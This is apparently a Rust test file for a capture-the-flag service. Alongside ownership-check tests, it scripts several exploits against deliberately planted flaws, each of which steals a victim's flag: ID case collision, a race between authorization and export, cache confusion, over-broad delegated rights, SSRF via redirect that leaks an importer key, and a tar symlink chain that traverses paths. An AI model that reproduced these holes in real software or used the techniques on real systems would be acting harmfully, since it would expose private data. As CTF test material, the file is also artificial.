use orbit_ctf::Server;
use serde_json::{json, Value};
use std::io::{Read, Write};
use std::net::{IpAddr, TcpListener, TcpStream, UdpSocket};
use std::sync::atomic::{AtomicU64, Ordering};
use std::thread;

static NEXT: AtomicU64 = AtomicU64::new(0);

fn service() -> Server {
    let n = NEXT.fetch_add(1, Ordering::Relaxed);
    let root = std::env::temp_dir().join(format!("orbit-ctf-test-{}-{n}", std::process::id()));
    Server::new(root).unwrap()
}
fn call(s: &Server, action: &str, token: &str, fields: Value) -> Value {
    let mut req = fields;
    req["action"] = json!(action);
    req["token"] = json!(token);
    s.rpc(req).unwrap()
}
fn register(s: &Server) -> String {
    s.rpc(json!({"action":"register"})).unwrap()["token"]
        .as_str()
        .unwrap()
        .to_owned()
}
fn id(v: &Value, key: &str) -> String {
    v[key].as_str().unwrap().to_owned()
}
fn denied(s: &Server, action: &str, token: &str, fields: Value) {
    let mut req = fields;
    req["action"] = json!(action);
    req["token"] = json!(token);
    assert!(s.rpc(req).is_err());
}
fn flight(s: &Server, token: &str, manifest: &str, navigation: &str) -> String {
    id(
        &call(
            s,
            "create_flight",
            token,
            json!({
                "geometry":"M 1 2 L 3 4", "map_version":"map-7", "options":"fast",
                "manifest":manifest,"navigation":navigation
            }),
        ),
        "flight_id",
    )
}

fn local_interface_ip() -> IpAddr {
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    socket.connect("224.0.0.1:9").unwrap();
    let ip = socket.local_addr().unwrap().ip();
    assert!(!ip.is_loopback(), "a non-loopback interface is required");
    ip
}

#[test]
fn authentication_and_owner_boundaries_are_enforced() {
    let s = service();
    let alice = register(&s);
    let bob = register(&s);
    assert_ne!(alice, bob);
    assert!(s
        .rpc(json!({"action":"create_ship","token":"invalid"}))
        .is_err());
    assert!(s
        .rpc(json!({"action":"does_not_exist","token":alice}))
        .is_err());

    let ship = id(&call(&s, "create_ship", &alice, json!({})), "ship_id");
    denied(
        &s,
        "post_message",
        &bob,
        json!({"ship_id":ship,"message":"not allowed"}),
    );
    denied(&s, "create_profile", &bob, json!({"ship_id":ship}));
    denied(&s, "bind_source", &bob, json!({"source_id":ship}));
}

#[test]
fn ordinary_ship_export_and_flight_workflows_remain_usable() {
    let s = service();
    let user = register(&s);
    let ship = id(&call(&s, "create_ship", &user, json!({})), "ship_id");
    call(
        &s,
        "post_message",
        &user,
        json!({"ship_id":ship,"message":"status nominal"}),
    );
    let source = call(&s, "read_source_messages", &user, json!({"source_id":ship}));
    assert_eq!(source["messages"], json!(["status nominal"]));

    let profile = id(
        &call(&s, "create_profile", &user, json!({"ship_id":ship})),
        "profile_id",
    );
    let job = id(
        &call(&s, "create_export", &user, json!({"profile_id":profile})),
        "job_id",
    );
    let draft = call(&s, "export_result", &user, json!({"job_id":job}));
    assert_eq!(draft["state"], "DRAFT");
    assert!(draft["messages"].is_null());
    call(&s, "run_export", &user, json!({"job_id":job}));
    let done = call(&s, "export_result", &user, json!({"job_id":job}));
    assert_eq!(done["state"], "DONE");
    assert_eq!(done["messages"], json!(["status nominal"]));
    denied(&s, "run_export", &user, json!({"job_id":job}));

    let own_flight = flight(&s, &user, "ordinary cargo", "private route");
    let manifest = call(&s, "read_manifest", &user, json!({"flight_id":own_flight}));
    assert_eq!(manifest["manifest"], "ordinary cargo");
    let report = call(&s, "report", &user, json!({"flight_id":own_flight}));
    assert_eq!(report["manifest"], "ordinary cargo");

    let navigation = call(
        &s,
        "read_navigation",
        &user,
        json!({"flight_id":own_flight}),
    );
    assert_eq!(navigation["navigation"], "private route");

    let summary = id(
        &call(
            &s,
            "create_summary",
            &user,
            json!({"content":"ordinary summary"}),
        ),
        "summary_id",
    );
    let content = call(&s, "read_summary", &user, json!({"summary_id":summary}));
    assert_eq!(content["content"], "ordinary summary");
}

#[test]
fn summary_and_navigation_owner_boundaries_are_enforced() {
    let s = service();
    let owner = register(&s);
    let attacker = register(&s);
    let flight_id = flight(&s, &owner, "cargo", "private navigation");
    let summary_id = id(
        &call(
            &s,
            "create_summary",
            &owner,
            json!({"content":"private summary"}),
        ),
        "summary_id",
    );

    denied(
        &s,
        "read_navigation",
        &attacker,
        json!({"flight_id":flight_id}),
    );
    denied(
        &s,
        "read_summary",
        &attacker,
        json!({"summary_id":summary_id}),
    );
}

#[test]
fn source_identifier_collision_reads_foreign_message() {
    let s = service();
    let victim = register(&s);
    let attacker = register(&s);
    let ship = id(&call(&s, "create_ship", &victim, json!({})), "ship_id");
    call(
        &s,
        "post_message",
        &victim,
        json!({"ship_id":ship,"message":"FLAG_MESSAGE_1"}),
    );
    denied(
        &s,
        "read_source_messages",
        &attacker,
        json!({"source_id":ship}),
    );
    let alias = ship.to_ascii_uppercase();
    call(&s, "bind_source", &attacker, json!({"source_id":alias}));
    let result = call(
        &s,
        "read_source_messages",
        &attacker,
        json!({"source_id":alias}),
    );
    assert_eq!(result["messages"], json!(["FLAG_MESSAGE_1"]));
}

#[test]
fn mutable_export_profile_changes_target_after_authorization() {
    let s = service();
    let victim = register(&s);
    let attacker = register(&s);
    let foreign = id(&call(&s, "create_ship", &victim, json!({})), "ship_id");
    let own = id(&call(&s, "create_ship", &attacker, json!({})), "ship_id");
    call(
        &s,
        "post_message",
        &victim,
        json!({"ship_id":foreign,"message":"FLAG_MESSAGE_2"}),
    );
    let profile = id(
        &call(&s, "create_profile", &attacker, json!({"ship_id":own})),
        "profile_id",
    );
    let job = id(
        &call(
            &s,
            "create_export",
            &attacker,
            json!({"profile_id":profile}),
        ),
        "job_id",
    );
    call(
        &s,
        "edit_profile",
        &attacker,
        json!({"profile_id":profile,"ship_id":foreign}),
    );
    denied(
        &s,
        "create_export",
        &attacker,
        json!({"profile_id":profile}),
    );
    let result = call(&s, "run_export", &attacker, json!({"job_id":job}));
    assert_eq!(result["messages"], json!(["FLAG_MESSAGE_2"]));
}

#[test]
fn geometry_cache_uses_first_flights_manifest() {
    let s = service();
    let victim = register(&s);
    let attacker = register(&s);
    let foreign = flight(&s, &victim, "FLAG_MANIFEST_3", "private nav");
    let public = call(&s, "flight_public", &attacker, json!({"flight_id":foreign}));
    assert_eq!(public["geometry"], "M 1 2 L 3 4");
    denied(&s, "report", &attacker, json!({"flight_id":foreign}));
    let own = flight(&s, &attacker, "ordinary manifest", "own nav");
    let report = call(&s, "report", &attacker, json!({"flight_id":own}));
    assert_eq!(report["manifest"], "FLAG_MANIFEST_3");
}

#[test]
fn delegated_rights_can_exceed_parent_rights() {
    let s = service();
    let victim = register(&s);
    let attacker = register(&s);
    let foreign = flight(&s, &victim, "FLAG_MANIFEST_4", "private nav");
    let parent = id(
        &call(&s, "grant_geometry", &victim, json!({"flight_id":foreign})),
        "grant_id",
    );
    denied(
        &s,
        "read_manifest",
        &attacker,
        json!({"flight_id":foreign,"grant_id":parent}),
    );
    let child = id(
        &call(
            &s,
            "delegate",
            &attacker,
            json!({"parent_id":parent,"rights":["manifest.read"],"expires":1000}),
        ),
        "grant_id",
    );
    let result = call(
        &s,
        "read_manifest",
        &attacker,
        json!({"flight_id":foreign,"grant_id":child}),
    );
    assert_eq!(result["manifest"], "FLAG_MANIFEST_4");
}

#[test]
fn redirect_keeps_importer_secret_and_reads_internal_summary() {
    let s = service();
    let victim = register(&s);
    let attacker = register(&s);
    let summary = id(
        &call(
            &s,
            "create_summary",
            &victim,
            json!({"content":"FLAG_SUMMARY_5"}),
        ),
        "summary_id",
    );
    let internal = TcpListener::bind("127.0.0.1:0").unwrap();
    let internal_port = internal.local_addr().unwrap().port();
    let server = s.clone();
    thread::spawn(move || server.serve(internal).unwrap());
    let redirector = TcpListener::bind("0.0.0.0:0").unwrap();
    let redirect_port = redirector.local_addr().unwrap().port();
    let redirect_host = local_interface_ip();
    let dest = format!("http://127.0.0.1:{internal_port}/internal/summaries/{summary}");
    thread::spawn(move || {
        let (mut stream, _) = redirector.accept().unwrap();
        let mut request = Vec::new();
        let mut buf = [0u8; 2048];
        while !request.windows(4).any(|window| window == b"\r\n\r\n") {
            let n = stream.read(&mut buf).unwrap();
            assert_ne!(n, 0, "connection closed before the HTTP headers arrived");
            request.extend_from_slice(&buf[..n]);
        }
        assert!(std::str::from_utf8(&request)
            .unwrap()
            .contains("X-Importer-Key:"));
        write!(stream,"HTTP/1.1 302 Found\r\nLocation: {dest}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n").unwrap();
    });
    denied(
        &s,
        "import_bulletin",
        &attacker,
        json!({"url":format!("http://127.0.0.1:{internal_port}/internal/summaries/{summary}")}),
    );
    let result = call(
        &s,
        "import_bulletin",
        &attacker,
        json!({"url":format!("http://{redirect_host}:{redirect_port}/bulletin")}),
    );
    assert_eq!(result["content"], "FLAG_SUMMARY_5");
}

fn tar(entries: &[(&str, u8, &str, &[u8])]) -> Vec<u8> {
    let mut out = Vec::new();
    for (name, kind, link, data) in entries {
        let mut h = [0u8; 512];
        h[..name.len()].copy_from_slice(name.as_bytes());
        h[100..108].copy_from_slice(b"0000644\0");
        h[108..116].copy_from_slice(b"0000000\0");
        h[116..124].copy_from_slice(b"0000000\0");
        let size = format!("{:011o}\0", data.len());
        h[124..136].copy_from_slice(size.as_bytes());
        h[136..148].copy_from_slice(b"00000000000\0");
        h[148..156].fill(b' ');
        h[156] = *kind;
        h[157..157 + link.len()].copy_from_slice(link.as_bytes());
        h[257..263].copy_from_slice(b"ustar\0");
        h[263..265].copy_from_slice(b"00");
        let sum: u32 = h.iter().map(|x| *x as u32).sum();
        h[148..156].copy_from_slice(format!("{:06o}\0 ", sum).as_bytes());
        out.extend_from_slice(&h);
        out.extend_from_slice(data);
        out.resize(out.len().div_ceil(512) * 512, 0);
    }
    out.extend_from_slice(&[0u8; 1024]);
    out
}

fn upload(s: &Server, token: &str, id: &str, bytes: &[u8]) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let server = s.clone();
    thread::spawn(move || server.serve(listener).unwrap());
    let mut stream = TcpStream::connect(addr).unwrap();
    write!(stream,"PUT /packages/{id}/content HTTP/1.1\r\nAuthorization: Bearer {token}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",bytes.len()).unwrap();
    stream.write_all(bytes).unwrap();
    let mut response = String::new();
    stream.read_to_string(&mut response).unwrap();
    assert!(response.starts_with("HTTP/1.1 200"), "{response}");
}

#[test]
fn approved_package_swap_and_symlink_chain_reads_navigation() {
    let s = service();
    let victim = register(&s);
    let attacker = register(&s);
    let foreign = flight(&s, &victim, "victim cargo", "FLAG_NAVIGATION_6");
    let package = id(
        &call(&s, "create_package", &attacker, json!({})),
        "package_id",
    );
    let safe = tar(&[("attachment.txt", b'0', "", b"ordinary report")]);
    upload(&s, &attacker, &package, &safe);
    denied(
        &s,
        "generate_report",
        &attacker,
        json!({"package_id":package,"attachment":"attachment.txt"}),
    );
    call(
        &s,
        "approve_package",
        &attacker,
        json!({"package_id":package}),
    );
    let normal = call(
        &s,
        "generate_report",
        &attacker,
        json!({"package_id":package,"attachment":"attachment.txt"}),
    );
    assert_eq!(normal["report"], "ordinary report");
    let target = format!("../../navigation/{foreign}.txt");
    let swapped = tar(&[
        ("attachment.txt", b'2', "bridge", b""),
        ("bridge", b'2', &target, b""),
    ]);
    upload(&s, &attacker, &package, &swapped);
    let report = call(
        &s,
        "generate_report",
        &attacker,
        json!({"package_id":package,"attachment":"attachment.txt"}),
    );
    assert_eq!(report["report"], "FLAG_NAVIGATION_6");
}
